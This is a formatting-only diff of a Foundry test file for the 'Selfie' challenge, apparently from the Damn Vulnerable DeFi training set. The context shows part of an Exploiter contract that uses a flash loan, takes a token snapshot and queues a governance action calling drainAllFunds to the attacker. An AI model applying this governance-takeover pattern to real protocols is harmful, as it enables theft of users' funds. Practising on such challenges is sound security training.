@@ -4,10 +4,8 @@ pragma solidity >=0.8.0;
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
 
-import {DamnValuableTokenSnapshot} from
-    "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
-import {SimpleGovernance} from
-    "../../../src/Contracts/selfie/SimpleGovernance.sol";
+import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
+import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
 
 contract Selfie is Test {
@@ -107,9 +105,7 @@ contract Exploiter {
     function receiveTokens(address token, uint256 amount) external {
         dvt.snapshot();
         targetActionId = simpleGovernance.queueAction(
-            address(selfiePool),
-            abi.encodeWithSignature("drainAllFunds(address)", attacker),
-            0
+            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0
         );
         dvt.transfer(msg.sender, amount);
     }
